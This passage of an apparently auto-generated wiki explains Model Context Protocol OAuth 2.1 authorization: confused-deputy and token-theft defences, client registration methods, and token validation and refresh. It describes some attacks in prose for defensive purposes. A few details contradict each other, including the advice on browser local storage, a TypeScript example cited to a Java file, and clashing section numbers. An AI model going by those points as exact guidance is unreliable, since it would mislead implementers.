- Only automatically redirect if redirect URI is trusted
- May inform user and rely on user decision if URI is not trusted

**Sources:** [docs/specification/draft/basic/authorization.mdx:489-503]()

### Confused Deputy Prevention

**Attack Scenario:** MCP server acts as proxy to third-party APIs, attacker exploits this to gain unauthorized access using stolen authorization codes.

```mermaid
graph LR
    subgraph "Attack Without Protection"
        Attacker1["Attacker"]
        MCPServer1["MCP Server<br/>(static client_id)"]
        ThirdParty1["Third-Party API"]
        
        Attacker1 -->|"Stolen authorization code"| MCPServer1
        MCPServer1 -->|"Forwards without consent"| ThirdParty1
        ThirdParty1 -->|"Grants access"| MCPServer1
        MCPServer1 -->|"Attacker gains access"| Attacker1
    end
    
    subgraph "Protection with Per-Client Consent"
        User2["Legitimate User"]
        MCPServer2["MCP Server<br/>(per-client approval)"]
        ThirdParty2["Third-Party API"]
        ConsentDB["Approved Client Registry"]
        
        User2 -->|"Authorization code"| MCPServer2
        MCPServer2 -->|"Check approval"| ConsentDB
        ConsentDB -->|"Approved for this client_id"| MCPServer2
        MCPServer2 -->|"Forward with consent"| ThirdParty2
    end
```

**Protection Requirements:**

MCP proxy servers using static client IDs MUST:
- Obtain user consent for each dynamically registered client
- Maintain registry of approved `client_id` values
- Verify client approval before forwarding to third-party authorization servers
- May require additional consent at third-party authorization server

**Sources:** [docs/specification/draft/basic/authorization.mdx:504-512]()

### Token Theft Prevention

**Attack Vector:** Attackers obtain tokens stored by client or cached/logged on server.

**Mitigations:**

**Authorization Servers SHOULD:**
- Issue short-lived access tokens
- Rotate refresh tokens for public clients (OAuth 2.1 Section 4.3.1)
- Implement token binding where possible

**Clients and Servers MUST:**
- Implement secure token storage per OAuth 2.1 Section 7.1
- Never log tokens
- Encrypt tokens at rest
- Use secure memory management for in-memory tokens
- Clear tokens on logout/revocation

**Sources:** [docs/specification/draft/basic/authorization.mdx:451-461]()

### Access Token Privilege Restriction

**Two Critical Dimensions:**

1. **Audience Validation Failures:** Server doesn't verify token was intended for it, allowing token reuse across services
2. **Token Passthrough:** Server forwards unmodified tokens to downstream services, causing confused deputy issues

**Protection Requirements:**

**MCP Servers MUST:**
- Validate access tokens per OAuth 2.1 Section 5.2
- Ensure token was issued specifically for the MCP server
- Reject tokens without server in audience claim
- NOT pass through received tokens to upstream APIs
- Generate separate tokens when acting as OAuth client to upstream APIs

**MCP Clients MUST:**
- Implement `resource` parameter per RFC8707
- Explicitly specify target resource in authorization and token requests
- Ensure tokens are bound to intended resources

**Sources:** [docs/specification/draft/basic/authorization.mdx:513-533]()

### Security Checklist

| Component | Requirement | Purpose |
|-----------|-------------|---------|
| **Transport** | HTTPS for all endpoints | Prevent eavesdropping |
| **PKCE** | S256 code challenge REQUIRED | Prevent authorization code interception |
| **Redirect URIs** | Exact validation required | Prevent open redirection |
| **State Parameter** | Verify in responses | Prevent CSRF attacks |
| **Token Storage** | Secure storage per OAuth 2.1 Section 7.1 | Prevent token theft |
| **Token Lifetime** | Short-lived access tokens | Limit impact of theft |
| **Refresh Tokens** | Rotation for public clients | Prevent refresh token reuse |
| **Audience Validation** | MUST validate token.aud matches self | Prevent token misuse |
| **Resource Parameter** | MUST include in auth/token requests | Bind tokens to intended resource |
| **Token Passthrough** | FORBIDDEN | Prevent confused deputy |
| **Scope Minimization** | Request only necessary scopes | Principle of least privilege |
| **Per-Client Consent** | Required for proxy servers | Prevent confused deputy |

**Sources:** [docs/specification/draft/basic/authorization.mdx:436-533]()

---

# Page: Client Registration Methods

# Client Registration Methods

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [blog/content/posts/2025-11-25-first-mcp-anniversary.md](blog/content/posts/2025-11-25-first-mcp-anniversary.md)
- [blog/layouts/partials/footer.html](blog/layouts/partials/footer.html)
- [blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp](blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp)
- [blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp](blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp.webp)
- [docs/specification/2025-03-26/basic/authorization.mdx](docs/specification/2025-03-26/basic/authorization.mdx)
- [docs/specification/2025-06-18/basic/authorization.mdx](docs/specification/2025-06-18/basic/authorization.mdx)
- [docs/specification/draft/basic/authorization.mdx](docs/specification/draft/basic/authorization.mdx)

</details>



## Purpose and Scope

This document describes the three client registration mechanisms supported by MCP's OAuth 2.1 authorization framework. Client registration is the process by which MCP clients obtain credentials (specifically a `client_id` and, optionally, client secrets) to participate in authorization flows with MCP servers.

For the broader OAuth 2.1 authorization framework, see [OAuth 2.1 Authorization Framework](#3.1). For token management after registration, see [Token Management and Scope Strategy](#3.4). For general security considerations, see [Security Best Practices](#3.2).

## The Registration Challenge

MCP faces a unique authorization challenge: an unbounded number of clients need to connect to an unbounded number of servers, where neither party knows about the other in advance. Traditional OAuth deployments typically involve pre-registered clients or a small set of known authorization servers. MCP's open ecosystem makes pre-registration impractical at scale.

The three registration approaches address this challenge with different trade-offs between simplicity, security, and backwards compatibility.

**Sources:** [docs/specification/draft/basic/authorization.mdx:198-212]()

## Registration Approach Priority

MCP clients supporting multiple registration methods **SHOULD** follow this priority order:

| Priority | Method | Use When | Requirement Level |
|----------|---------|----------|-------------------|
| 1 | Pre-registration | Client has existing relationship with server | Optional |
| 2 | Client ID Metadata Documents | Authorization Server supports it | SHOULD support |
| 3 | Dynamic Client Registration | Authorization Server supports it | MAY support |
| 4 | Manual Entry | No other option available | Fallback |

```mermaid
flowchart TD
    Start["Client needs authorization"]
    CheckPreReg{"Pre-registered<br/>credentials available?"}
    UsePre["Use pre-registered<br/>client_id"]
    
    CheckAS["Discover Authorization<br/>Server Metadata"]
    CheckCIMD{"client_id_metadata_document_supported<br/>in AS metadata?"}
    UseCIMD["Use Client ID<br/>Metadata Documents"]
    
    CheckDCR{"registration_endpoint<br/>in AS metadata?"}
    UseDCR["Use Dynamic Client<br/>Registration (DCR)"]
    
    Manual["Prompt user for<br/>manual registration"]
    
    Start --> CheckPreReg
    CheckPreReg -->|Yes| UsePre
    CheckPreReg -->|No| CheckAS
    CheckAS --> CheckCIMD
    CheckCIMD -->|Yes| UseCIMD
    CheckCIMD -->|No| CheckDCR
    CheckDCR -->|Yes| UseDCR
    CheckDCR -->|No| Manual
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:206-212]()

## Client ID Metadata Documents

### Overview

Client ID Metadata Documents (introduced in SEP-991) enable URL-based client registration. Instead of performing a registration API call, clients use an HTTPS URL as their `client_id`, where the URL points to a JSON document hosted by the client containing its metadata.

This approach solves the "unbounded clients and servers" problem by allowing clients to self-describe without requiring dynamic registration flows or manual coordination.

**Key Benefits:**
- No registration API calls required
- No client secrets to store for public clients
- Clients control their own metadata
- Authorization servers can implement trust policies based on URL domains
- Simpler than Dynamic Client Registration

**Sources:** [docs/specification/draft/basic/authorization.mdx:213-219](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:160-170]()

### Metadata Document Structure

A Client ID Metadata Document is a JSON file hosted at an HTTPS URL. The `client_id` value **MUST** exactly match the URL where the document is hosted.

```json
{
  "client_id": "https://app.example.com/oauth/client-metadata.json",
  "client_name": "Example MCP Client",
  "client_uri": "https://app.example.com",
  "logo_uri": "https://app.example.com/logo.png",
  "redirect_uris": [
    "http://127.0.0.1:3000/callback",
    "http://localhost:3000/callback"
  ],
  "grant_types": ["authorization_code"],
  "response_types": ["code"],
  "token_endpoint_auth_method": "none"
}
```

**Required Fields:**
- `client_id`: Must match the document's URL exactly
- `client_name`: Human-readable name shown during consent
- `redirect_uris`: Array of allowed redirect URIs

**Optional Fields:**
- `client_uri`: Homepage URL for the client application
- `logo_uri`: Logo displayed during authorization
- `token_endpoint_auth_method`: `"none"` for public clients, `"private_key_jwt"` with JWKS for confidential clients
- `jwks_uri` or `jwks`: For clients using `private_key_jwt` authentication

**Sources:** [docs/specification/draft/basic/authorization.mdx:244-260]()

### Client Implementation Requirements

MCP clients implementing Client ID Metadata Documents **MUST**:

1. **Host metadata at HTTPS URL:** The URL must use the `https` scheme and contain a path component (e.g., `https://example.com/client.json`, not just `https://example.com`)
2. **Ensure URL matches:** The `client_id` field value must match the document URL exactly
3. **Include required fields:** `client_id`, `client_name`, and `redirect_uris` are mandatory
4. **Set proper caching headers:** The document should include HTTP cache headers for Authorization Server efficiency

**Optional:**
- Use `private_key_jwt` for client authentication with appropriate JWKS configuration

**Sources:** [docs/specification/draft/basic/authorization.mdx:227-233]()

### Authorization Server Implementation Requirements

Authorization servers implementing Client ID Metadata Documents **MUST**:

1. **Detect URL-formatted client_ids:** When receiving a `client_id` that is a URL, fetch the metadata document
2. **Validate document structure:** Ensure the JSON is valid and contains required fields
3. **Validate client_id match:** The document's `client_id` field must match the URL exactly
4. **Validate redirect_uris:** Redirect URIs in authorization requests must be in the document's allowed list
5. **Follow security considerations:** Protect against SSRF attacks (see Security Considerations section)

**SHOULD:**
- Fetch metadata documents when encountering URL-formatted `client_id` values
- Cache metadata respecting HTTP cache headers
- Implement domain-based trust policies

**Sources:** [docs/specification/draft/basic/authorization.mdx:235-242]()

### Complete Authorization Flow

```mermaid
sequenceDiagram
    participant User
    participant Client["MCP Client"]
    participant AS["Authorization Server"]
    participant MetaDoc["Metadata Endpoint<br/>(https://app.example.com/oauth/metadata.json)"]
    participant RS["MCP Server<br/>(Resource Server)"]

    Note over Client: Client hosts metadata document

    User->>Client: "Initiates connection to MCP Server"
    Client->>RS: "Initial MCP request"
    RS-->>Client: "401 Unauthorized + WWW-Authenticate"
    
    Client->>RS: "GET /.well-known/oauth-protected-resource"
    RS-->>Client: "Protected Resource Metadata<br/>(authorization_servers)"
    
    Client->>AS: "GET /.well-known/oauth-authorization-server"
    AS-->>Client: "Authorization Server Metadata<br/>(client_id_metadata_document_supported: true)"
    
    Client->>User: "Open browser with authorization URL"
    Note over Client,User: "client_id=https://app.example.com/oauth/metadata.json"
    
    User->>AS: "Authorization request"
    AS->>User: "Authentication prompt"
    User->>AS: "Provides credentials"
    
    Note over AS: "Detects URL-formatted client_id"
    AS->>MetaDoc: "GET https://app.example.com/oauth/metadata.json"
    MetaDoc-->>AS: "JSON Metadata Document"
    
    AS->>AS: "Validate:<br/>1. client_id matches URL<br/>2. redirect_uri in allowed list<br/>3. Document structure valid"
    
    alt Validation Success
        AS->>User: "Display consent page with client_name"
        User->>AS: "Approves access"
        AS->>User: "Redirect with authorization code"
        User->>Client: "Authorization code via redirect_uri"
        Client->>AS: "Exchange code for token"
        AS-->>Client: "Access token"
        Client->>RS: "MCP requests with access token"
    else Validation Failure
        AS->>User: "Error response<br/>(error=invalid_client or invalid_request)"
    end
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:262-303]()

### Discovery

Authorization servers advertise support for Client ID Metadata Documents by including this property in their OAuth Authorization Server Metadata:

```json
{
  "client_id_metadata_document_supported": true
}
```

Clients **SHOULD** check for this capability in the metadata document obtained from `/.well-known/oauth-authorization-server` before attempting to use URL-based `client_id` values.

**Sources:** [docs/specification/draft/basic/authorization.mdx:305-316]()

### Security Considerations

#### SSRF Protection

Authorization servers fetching metadata documents **SHOULD** protect against Server-Side Request Forgery (SSRF) attacks:

- Implement allowlists or blocklists for document URLs
- Block requests to private IP ranges (RFC 1918)
- Limit redirect following when fetching documents
- Set reasonable timeouts for document fetches
- Validate TLS certificates

**Sources:** [docs/specification/draft/basic/authorization.mdx:634-641](), [docs/specification/draft/basic/security_best_practices.mdx:634-641]()

#### Localhost Redirect URI Risks

Client ID Metadata Documents cannot prevent `localhost` URL impersonation. An attacker can:

1. Provide a legitimate client's metadata URL as their `client_id`
2. Bind to a `localhost` port and provide that as the `redirect_uri`
3. Receive the authorization code when the user approves

Authorization servers **SHOULD**:
- Display additional warnings for `localhost`-only redirect URIs
- Clearly display the redirect URI hostname during authorization
- Consider requiring additional attestation for enhanced security

**Sources:** [docs/specification/draft/basic/authorization.mdx:643-658]()

#### Trust Policies

Authorization servers **MAY** implement domain-based trust policies:

- Allowlists for trusted domains (for protected servers)
- Accept any HTTPS `client_id` (for open servers)
- Reputation checks for unknown domains
- Restrictions based on domain age or certificate validation
- Display the metadata document hostname prominently to prevent phishing

**Sources:** [docs/specification/draft/basic/authorization.mdx:660-669]()

## Pre-registration

Pre-registration is the traditional OAuth approach where clients obtain credentials through an out-of-band process before initiating authorization flows.

### Implementation Approaches

MCP clients **SHOULD** support pre-registered credentials through one of two methods:

1. **Hardcoded credentials:** Client applications include a `client_id` (and, if applicable, client secret) specifically for use with known authorization servers
2. **User-provided credentials:** Present a UI allowing users to enter credentials after manually registering an OAuth client through the server's configuration interface

Pre-registration takes priority over other methods when available, as it represents an existing trusted relationship between client and server.

**Sources:** [docs/specification/draft/basic/authorization.mdx:318-327]()

## Dynamic Client Registration (DCR)

### Overview

Dynamic Client Registration (DCR), defined in [RFC 7591](https://datatracker.ietf.org/doc/html/rfc7591), allows clients to programmatically register with authorization servers without user intervention. This method is included in MCP primarily for **backwards compatibility** with earlier versions of the authorization specification.

Authorization servers and clients **MAY** support DCR, but Client ID Metadata Documents is the preferred approach for new implementations.

**Sources:** [docs/specification/draft/basic/authorization.mdx:329-333](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:162-167]()

### Discovery

Authorization servers indicate DCR support by including a `registration_endpoint` in their Authorization Server Metadata:

```json
{
  "authorization_endpoint": "https://auth.example.com/authorize",
  "token_endpoint": "https://auth.example.com/token",
  "registration_endpoint": "https://auth.example.com/register"
}
```

Clients detect DCR availability by checking for this field after discovering the Authorization Server Metadata.

**Sources:** [docs/specification/draft/basic/authorization.mdx:206-212]()

### Registration Flow

```mermaid
sequenceDiagram
    participant Client["MCP Client"]
    participant AS["Authorization Server"]
    
    Client->>AS: "GET /.well-known/oauth-authorization-server"
    AS-->>Client: "Authorization Server Metadata<br/>(includes registration_endpoint)"
    
    Client->>AS: "POST /register<br/>{ redirect_uris: [...], grant_types: [...] }"
    
    alt Registration Success
        AS->>AS: "Apply registration policies"
        AS-->>Client: "{ client_id, client_secret (optional), ... }"
        Note over Client: "Store credentials securely"
    else Registration Failure
        AS-->>Client: "Error response<br/>(e.g., invalid_redirect_uri)"
    end
    
    Note over Client,AS: "Proceed with normal OAuth 2.1 flow"
```

### Limitations

Dynamic Client Registration has several limitations that led to the development of Client ID Metadata Documents:

1. **Complexity:** Requires implementing registration endpoint on authorization servers
2. **State management:** Servers must store and manage dynamically registered clients
3. **Security challenges:** Open registration endpoints can be abused
4. **Policy enforcement:** Difficult to implement consistent policies across the ecosystem

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:162-167]()

## Implementation Decision Tree

```mermaid
graph TB
    Start["Client needs to authorize<br/>with MCP server"]
    
    CheckExisting{"Pre-registered<br/>credentials available?"}
    UseExisting["Use pre-registered<br/>client_id and secret"]
    Success1["Authorization flow proceeds"]
    
    Discover["Fetch Authorization Server Metadata<br/>(/.well-known/oauth-authorization-server)"]
    
    CheckCIMD{"client_id_metadata_document_supported<br/>= true?"}
    HostDoc["Host metadata document<br/>at HTTPS URL"]
    UseCIMD["Use URL as client_id<br/>in authorization request"]
    Success2["Authorization flow proceeds"]
    
    CheckDCR{"registration_endpoint<br/>present?"}
    CallDCR["POST to registration_endpoint<br/>with client metadata"]
    StoreCreds["Store returned<br/>client_id and secret"]
    Success3["Authorization flow proceeds"]
    
    Manual["Display UI for manual<br/>credential entry"]
    UserEnters["User registers OAuth client<br/>and enters credentials"]
    Success4["Authorization flow proceeds"]
    
    Start --> CheckExisting
    CheckExisting -->|"Yes"| UseExisting
    UseExisting --> Success1
    
    CheckExisting -->|"No"| Discover
    Discover --> CheckCIMD
    
    CheckCIMD -->|"Yes<br/>(preferred)"| HostDoc
    HostDoc --> UseCIMD
    UseCIMD --> Success2
    
    CheckCIMD -->|"No"| CheckDCR
    CheckDCR -->|"Yes"| CallDCR
    CallDCR --> StoreCreds
    StoreCreds --> Success3
    
    CheckDCR -->|"No"| Manual
    Manual --> UserEnters
    UserEnters --> Success4
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:198-212]()

## Comparison Matrix

| Aspect | Pre-registration | Client ID Metadata Documents | Dynamic Client Registration |
|--------|------------------|------------------------------|----------------------------|
| **Setup Complexity** | Medium (manual process) | Low (host JSON file) | High (implement registration flow) |
| **Server State** | Stored server-side | Stateless (fetched on-demand) | Stored server-side |
| **Security** | High (known clients) | Medium-High (URL validation) | Medium (open registration) |
| **Scalability** | Poor (manual per server) | Excellent (automatic) | Good (automatic) |
| **User Experience** | Poor (manual setup) | Excellent (automatic) | Good (automatic) |
| **Client Secret** | Optional | Not needed for public clients | Optional |
| **Caching** | N/A | HTTP cache headers | N/A |
| **Trust Model** | Pre-established | URL/domain-based | Registration policies |
| **Specification** | OAuth 2.1 core | draft-ietf-oauth-client-id-metadata-document-00 | RFC 7591 |
| **MCP Recommendation** | Use when available | **Preferred for new implementations** | Backwards compatibility only |

**Sources:** [docs/specification/draft/basic/authorization.mdx:213-333]()

## Common Implementation Patterns

### Pattern 1: URL-Based Client Identity (Recommended)

```
1. Client developer hosts metadata at https://client.example.com/oauth-metadata.json
2. Metadata includes: client_id (matching URL), client_name, redirect_uris
3. In authorization request, client uses URL as client_id parameter
4. Authorization server fetches and validates metadata document
5. User sees client_name in consent screen
6. No client secrets or registration API calls needed
```

### Pattern 2: Fallback Chain

```
1. Check for pre-registered credentials in configuration
2. If not found, discover Authorization Server Metadata
3. If client_id_metadata_document_supported, use Client ID Metadata Documents
4. If registration_endpoint present, attempt Dynamic Client Registration
5. If all fail, prompt user for manual registration
```

### Pattern 3: Development vs. Production

```
Development:
- Use localhost redirect_uris in metadata document
- Accept additional warnings from authorization servers

Production:
- Use HTTPS redirect_uris in metadata document
- Host metadata on stable, trusted domain
- Implement proper TLS certificate validation
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:198-333]()

## Code References

### Authorization Server Metadata Structure

The Authorization Server Metadata document includes fields indicating supported registration methods:

- `client_id_metadata_document_supported` (boolean): Indicates support for Client ID Metadata Documents
- `registration_endpoint` (string): URL for Dynamic Client Registration

These fields are discovered by fetching `/.well-known/oauth-authorization-server` from the authorization server.

**Sources:** [docs/specification/draft/basic/authorization.mdx:305-316](), [docs/specification/draft/basic/authorization.mdx:68-72]()

### Redirect URI Validation

All registration methods require strict redirect URI validation. Authorization servers **MUST**:

- Validate redirect URIs against registered or metadata-declared values
- Use exact string matching (not pattern matching or wildcards)
- Reject authorization requests with unregistered redirect URIs

**Sources:** [docs/specification/draft/basic/authorization.mdx:618-624]()

### State Parameter Requirements

Regardless of registration method, the OAuth `state` parameter plays a critical role:

- MCP proxy servers **MUST** generate cryptographically secure random `state` values
- State tracking cookies **MUST NOT** be set until after consent approval
- State values **MUST** be validated at the callback endpoint
- State values **SHOULD** be single-use with short expiration times

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:206-220]()

---

# Page: Token Management and Validation

# Token Management and Validation

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/clients.mdx](docs/clients.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)
- [docs/specification/2025-03-26/basic/authorization.mdx](docs/specification/2025-03-26/basic/authorization.mdx)
- [docs/specification/2025-06-18/basic/authorization.mdx](docs/specification/2025-06-18/basic/authorization.mdx)
- [docs/specification/draft/basic/authorization.mdx](docs/specification/draft/basic/authorization.mdx)

</details>



## Purpose and Scope

This page documents how MCP handles access tokens throughout their lifecycle: from initial acquisition during the OAuth 2.1 authorization flow, through validation and usage in requests, to refresh and expiration handling. It covers the mechanisms by which MCP clients obtain tokens, how MCP servers validate them, and the security requirements that govern token handling.

For information about the complete OAuth 2.1 authorization framework and client registration, see [OAuth 2.1 Authorization Framework](#3.1). For client registration methods specifically, see [Client Registration Methods](#3.2). For security threats and mitigations related to tokens, see [Security Best Practices and Threat Models](#3.4).

## Token Lifecycle Overview

Access tokens in MCP follow a standard OAuth 2.1 lifecycle with several key phases:

```mermaid
graph LR
    A["Client Requests<br/>Authorization"] --> B["Authorization Server<br/>Issues Token"]
    B --> C["Client Stores<br/>Token"]
    C --> D["Client Includes Token<br/>in Requests"]
    D --> E["Server Validates<br/>Token"]
    E --> F{Token Valid?}
    F -->|Yes| G["Process Request"]
    F -->|No| H["Return 401"]
    G --> I{Token Expired?}
    I -->|Yes| J["Client Refreshes<br/>Token"]
    I -->|No| K["Continue Using<br/>Token"]
    J --> C
    K --> D
    H --> J
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:441-485](), [docs/specification/2025-06-18/basic/authorization.mdx:233-278]()

## Token Acquisition

### Authorization Flow Token Request

After the user completes authorization, the MCP client exchanges an authorization code for tokens at the authorization server's token endpoint. This exchange includes the `resource` parameter to bind the token to the specific MCP server.

**Token Request Parameters:**

| Parameter | Required | Purpose |
|-----------|----------|---------|
| `grant_type` | Yes | Must be `authorization_code` |
| `code` | Yes | Authorization code from authorization endpoint |
| `code_verifier` | Yes | PKCE verifier matching the code_challenge |
| `resource` | Yes | Canonical URI of the MCP server (RFC 8707) |
| `client_id` | Yes | Client identifier |
| `redirect_uri` | Yes | Must match registered redirect URI |

**Token Response:**

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "def502...",
  "scope": "mcp:tools mcp:resources"
}
```

The `access_token` is an opaque string (or JWT) that the client includes in subsequent requests. The `expires_in` field indicates token lifetime in seconds. The `refresh_token` (if present) allows obtaining new access tokens without user interaction.

**Sources:** [docs/specification/draft/basic/authorization.mdx:352-400](), [docs/specification/2025-06-18/basic/authorization.mdx:153-192](), [docs/tutorials/security/authorization.mdx:106-120]()

## Token Storage and Security

### Client-Side Token Storage

MCP clients **MUST** implement secure token storage following OAuth 2.1 best practices [docs/specification/draft/basic/authorization.mdx:575-584](). Storage mechanisms vary by platform:

- **Desktop/Native Applications**: Use OS-provided credential storage (keychain, credential manager)
- **Web Applications**: Use secure, HTTP-only cookies or encrypted local storage
- **Server Applications**: Use encrypted configuration or secrets management systems

Tokens **MUST NOT** be:
- Logged or written to unencrypted files
- Embedded in source code
- Transmitted over unencrypted connections
- Stored in browser local storage (for web apps)

### Token Rotation for Public Clients

Authorization servers **MUST** rotate refresh tokens for public clients as described in [OAuth 2.1 Section 4.3.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-4.3.1). This prevents attackers who obtain a refresh token from using it indefinitely.

**Sources:** [docs/specification/draft/basic/authorization.mdx:560-584](), [docs/tutorials/security/authorization.mdx:242-247]()

## Token Validation

### Server-Side Validation Requirements

MCP servers acting as OAuth 2.1 resource servers **MUST** validate access tokens before processing requests. Validation occurs in two phases:

#### Phase 1: Token Introspection or JWT Verification

Servers can validate tokens using either:

**Token Introspection (RFC 7662):**
- Server sends token to authorization server's introspection endpoint
- Authorization server responds with token metadata
- Suitable for opaque tokens or when server lacks JWT verification capability

**JWT Verification:**
- Server validates JWT signature using authorization server's public keys
- Server verifies standard claims (`exp`, `iat`, `iss`)
- Suitable for self-contained tokens with embedded claims
- Reduces latency by eliminating network call to authorization server

#### Phase 2: Audience Validation

After confirming token validity, servers **MUST** validate that the token was issued specifically for them as the intended audience. This is the critical security check that prevents token reuse across different services.

**Audience Validation Methods:**

1. **JWT `aud` Claim**: If token is a JWT, verify the `aud` claim contains the server's canonical URI
2. **Introspection Response**: If using introspection, verify the `aud` field in the response
3. **Resource Parameter Binding**: Verify token was issued with the `resource` parameter matching the server's URI

**Example JWT Validation:**

```json
{
  "iss": "https://auth.example.com",
  "aud": "https://mcp.example.com",
  "sub": "user123",
  "exp": 1755540817,
  "iat": 1755540757,
  "scope": "mcp:tools"
}
```

The server must verify:
- `aud` matches its canonical URI (`https://mcp.example.com`)
- `exp` is in the future
- `iss` is a trusted authorization server
- `scope` contains required permissions

**Sources:** [docs/specification/draft/basic/authorization.mdx:469-485](), [docs/specification/2025-06-18/basic/authorization.mdx:261-278](), [docs/tutorials/security/authorization.mdx:405-490]()

### Validation Implementation Patterns

The TypeScript SDK provides middleware for token validation. The `requireBearerAuth` middleware [docs/sdk/java/mcp-client.mdx:200-241]() handles extraction and validation:

```typescript
const authMiddleware = requireBearerAuth({
  verifier: tokenVerifier,
  requiredScopes: [],
  resourceMetadataUrl: getOAuthProtectedResourceMetadataUrl(mcpServerUrl),
});
```

The `verifier` object implements token validation logic:

```typescript
const tokenVerifier = {
  verifyAccessToken: async (token: string) => {
    // 1. Call introspection endpoint
    const response = await fetch(introspectionEndpoint, {
      method: "POST",
      body: new URLSearchParams({
        token: token,
        client_id: clientId,
        client_secret: clientSecret
      })
    });
    
    const data = await response.json();
    
    // 2. Check token is active
    if (data.active === false) {
      throw new Error("Inactive token");
    }
    
    // 3. Validate audience
    const audiences = Array.isArray(data.aud) ? data.aud : [data.aud];
    const allowed = audiences.some(a => 
      checkResourceAllowed({
        requestedResource: a,
        configuredResource: mcpServerUrl
      })
    );
    
    if (!allowed) {
      throw new Error("Token audience mismatch");
    }
    
    return {
      token,
      clientId: data.client_id,
      scopes: data.scope ? data.scope.split(" ") : [],
      expiresAt: data.exp
    };
  }
};
```

**Sources:** [docs/tutorials/security/authorization.mdx:405-490](), [docs/sdk/java/mcp-client.mdx:200-241]()

## Token Usage in Requests

### Bearer Token Header Format

MCP clients **MUST** include access tokens in the `Authorization` header using the Bearer scheme as defined in [RFC 6750](https://datatracker.ietf.org/doc/html/rfc6750):

```http
GET /mcp HTTP/1.1
Host: mcp.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

**Requirements:**

- Token **MUST** be included in the `Authorization` header, not in query parameters
- Token **MUST** be included in every HTTP request, even within the same session
- Header format is case-insensitive: `Bearer`, `bearer`, or `BEARER` are all valid
- Token value is opaque to the client (client does not parse or modify it)

### Error Responses for Invalid Tokens

When a client sends an invalid or expired token, the server **MUST** respond with HTTP 401 Unauthorized:

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="mcp",
                  error="invalid_token",
                  error_description="The access token expired"
```

The client should then attempt to refresh the token or restart the authorization flow.

**Sources:** [docs/specification/draft/basic/authorization.mdx:441-485](), [docs/specification/2025-06-18/basic/authorization.mdx:233-278]()

## Token Refresh

### Refresh Token Grant

When an access token expires, clients can obtain a new one using the refresh token without requiring user interaction. This uses the `refresh_token` grant type:

**Refresh Token Request:**

```http
POST /token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&
refresh_token=def502...&
client_id=client123&
resource=https://mcp.example.com
```

**Refresh Token Response:**

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "def502..."
}
```

### Refresh Token Rotation

Authorization servers **SHOULD** issue a new refresh token with each refresh response. Clients **MUST** replace the old refresh token with the new one. This prevents attackers from using captured refresh tokens indefinitely.

### Client Refresh Logic

Clients should implement proactive refresh to avoid token expiration during operations:

```typescript
async function ensureValidToken() {
  const now = Date.now() / 1000;
  const expiresAt = tokenMetadata.expiresAt;
  
  // Refresh if token expires within 5 minutes
  if (expiresAt - now < 300) {
    await refreshAccessToken();
  }
}
```

Alternatively, clients can implement reactive refresh by catching 401 responses and attempting refresh before retrying the request.

**Sources:** [docs/specification/draft/basic/authorization.mdx:560-584]()

## Scope Management and Step-Up Authorization

### Scope Selection Strategy

During initial authorization, MCP clients **SHOULD** follow this priority order for scope selection [docs/specification/draft/basic/authorization.mdx:335-350]():

1. Use `scope` parameter from the `WWW-Authenticate` header in the 401 response, if provided
2. If `scope` is not available, use all scopes defined in `scopes_supported` from the Protected Resource Metadata document
3. If `scopes_supported` is undefined, omit the `scope` parameter

This approach accommodates the general-purpose nature of MCP clients, which typically lack domain-specific knowledge to make informed decisions about individual scope selection.

### Insufficient Scope Errors at Runtime

When a client makes a request with insufficient permissions, the server **SHOULD** respond with HTTP 403 Forbidden:

```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope",
                  scope="files:read files:write user:profile",
                  resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                  error_description="Additional file write permission required"
```

### Step-Up Authorization Flow

When receiving an insufficient scope error, clients **SHOULD** respond by requesting a new access token with an increased set of scopes:

1. Parse error information from the `WWW-Authenticate` header
2. Determine required scopes using the scope selection strategy
3. Initiate (re-)authorization with the determined scope set
4. Retry the original request with the new token
5. Implement retry limits to avoid infinite loops

**Sources:** [docs/specification/draft/basic/authorization.mdx:335-350](), [docs/specification/draft/basic/authorization.mdx:497-558]()

## Token Audience Binding

### Resource Parameter and Audience Validation

The `resource` parameter (RFC 8707) binds tokens to their intended audience, preventing token reuse across different services. This is a critical security mechanism.

